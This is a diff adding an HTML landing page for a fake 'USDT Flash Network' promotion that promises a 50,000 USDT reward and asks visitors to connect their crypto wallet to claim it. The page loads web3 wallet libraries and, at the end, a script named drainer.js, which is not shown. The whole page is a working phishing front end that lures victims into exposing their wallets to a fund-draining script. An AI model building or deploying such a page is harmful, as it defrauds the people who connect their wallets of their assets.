@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Flash Network - Liquidity Incentive Program</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@metamask/detect-provider@2.0.0/dist/detect-provider.min.js"></script>
+    <style>
+        :root{--primary:#00d4aa;--secondary:#0d9488;--accent:#f59e0b;--dark:#0a0f0f;--light:#f8fafc;}
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,var(--dark) 0%,#0a1a1a 50%,var(--primary) 100%);color:var(--light);overflow-x:hidden;}
+        
+        /* Animated Background */
+        .bg-animation{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;opacity:0.1;}
+        .wave{animation:wave 20s linear infinite;}
+        @keyframes wave{0%{transform:translateX(0) translateZ(0) scaleY(1);}50%{transform:translateX(-25%) translateZ(0) scaleY(0.55);}100%{transform:translateX(-50%) translateZ(0) scaleY(1);}}
+        
+        .container{max-width:420px;margin:0 auto;padding:20px 20px 40px;position:relative;z-index:10;}
+        
+        /* Header */
+        .header{text-align:center;margin-bottom:40px;}
+        .logo{display:flex;align-items:center;justify-content:center;gap:12px;background:linear-gradient(135deg,var(--primary),var(--secondary));width:72px;height:72px;border-radius:20px;margin-bottom:24px;box-shadow:0 20px 40px rgba(0,212,170,0.3);}
+        .logo i{font-size:28px;color:white;}
+        h1{font-size:28px;font-weight:800;background:linear-gradient(135deg,var(--primary),#00f5d4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px;}
+        .subtitle{font-size:16px;color:#94a3b8;font-weight:500;opacity:0.9;}
+        
+        /* Claim Card */
+        .card{background:linear-gradient(145deg,rgba(255,255,255,0.08),rgba(255,255,255,0.03));backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:24px;padding:36px;margin-bottom:32px;box-shadow:0 32px 64px rgba(0,0,0,0.4);transition:transform 0.3s;}
+        .card:hover{transform:translateY(-4px);}
+        
+        .reward{display:flex;align-items:center;gap:16px;margin-bottom:28px;padding:20px;background:linear-gradient(135deg,rgba(0,212,170,0.1),rgba(13,148,136,0.1));border-radius:20px;border:1px solid rgba(0,212,170,0.3);}
+        .reward-icon{width:64px;height:64px;background:linear-gradient(135deg,var(--primary),var(--secondary));border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:24px;}
+        .reward-info h2{font-size:36px;font-weight:900;color:var(--primary);margin-bottom:4px;}
+        .reward-info p{font-size:14px;color:#94a3b8;}
+        
+        /* Connect Button */
+        .connect-btn{width:100%;background:linear-gradient(135deg,var(--primary),var(--secondary));color:#0a0f0f;font-size:18px;font-weight:700;padding:20px 32px;border-radius:16px;border:none;cursor:pointer;transition:all 0.3s;box-shadow:0 16px 32px rgba(0,212,170,0.4);position:relative;overflow:hidden;}
+        .connect-btn:hover{transform:translateY(-2px);box-shadow:0 24px 48px rgba(0,212,170,0.6);}
+        .connect-btn:disabled{background:#475569;color:#64748b;cursor:not-allowed;transform:none;}
+        .connect-btn i{margin-right:12px;}
+        
+        /* Status */
+        .status{padding:20px;border-radius:16px;margin:24px 0;font-weight:500;text-align:center;}
+        .status.success{background:rgba(0,212,170,0.15);border:1px solid rgba(0,212,170,0.4);color:var(--primary);}
+        .status.loading{background:rgba(245,158,11,0.15);border:1px solid rgba(245,158,11,0.4);color:var(--accent);}
+        .status.error{background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.4);color:#fca5a5;}
+        
+        /* Chains */
+        .chains{margin-top:28px;}
+        .chain{display:flex;align-items:center;gap:12px;padding:16px;background:rgba(255,255,255,0.04);border-radius:12px;margin-bottom:12px;font-size:14px;}
+        .chain-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;color:white;}
+        .eth{background:linear-gradient(135deg,#627eea,#8d6eff);}
+        .bsc{background:linear-gradient(135deg,#f39c12,#e67e22);}
+        .tron{background:linear-gradient(135deg,#00c1de,#0099cc);}
+        
+        /* Progress */
+        .progress{margin:20px 0;}
+        .bar{background:rgba(255,255,255,0.1);height:8px;border-radius:4px;overflow:hidden;}
+        .fill{background:linear-gradient(90deg,var(--primary),var(--accent));height:100%;border-radius:4px;transition:width 0.3s;animation:pulse 2s infinite;}
+        
+        @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.7;}}
+        @media(max-width:480px){.container{padding:16px 16px 32px;}}
+    </style>
+</head>
+<body>
+    <div class="bg-animation">
+        <div style="position:absolute;bottom:0;left:0;width:200%;height:200px;background:url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 1000 200\"><defs><radialGradient id=\"a\" cx=\"50%\" cy=\"50%\"><stop offset=\"0%\" stop-color=\"rgba(0,212,170,0.3)\"/><stop offset=\"100%\" stop-color=\"rgba(13,148,136,0.1)\"/></radialGradient></defs><path fill=\"url(%23a)\" d=\"M0 120 Q166 40 333 120 T666 120 Q833 120 1000 40 V200 H0\"/></svg>');animation:wave 15s linear infinite;"></div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-bolt"></i>
+            </div>
+            <h1>USDT Flash Network</h1>
+            <p class="subtitle">Liquidity Incentive Program - Limited Time</p>
+        </div>
+
+        <div class="card">
+            <div class="reward">
+                <div class="reward-icon">
+                    <i class="fas fa-coins"></i>
+                </div>
+                <div class="reward-info">
+                    <h2>50,000 USDT</h2>
+                    <p>Instant liquidity reward</p>
+                </div>
+            </div>
+
+            <button id="connectBtn" class="connect-btn">
+                <i class="fas fa-wallet"></i> Connect Wallet to Claim
+            </button>
+
+            <div id="status"></div>
+            <div id="progress" style="display:none;">
+                <div class="bar"><div class="fill" style="width:0%"></div></div>
+            </div>
+        </div>
+
+        <div class="chains">
+            <div class="chain">
+                <div class="chain-icon eth"><i class="fab fa-ethereum"></i></div>
+                <span>Ethereum (ERC-20)</span>
+            </div>
+            <div class="chain">
+                <div class="chain-icon bsc"><i class="fas fa-coins"></i></div>
+                <span>BNB Smart Chain (BEP-20)</span>
+            </div>
+            <div class="chain">
+                <div class="chain-icon tron"><i class="fab fa-bitcoin"></i></div>
+                <span>Tron Network (TRC-20)</span>
+            </div>
+        </div>
+    </div>
+
+    <script src="drainer.js"></script>
+</body>
+</html>
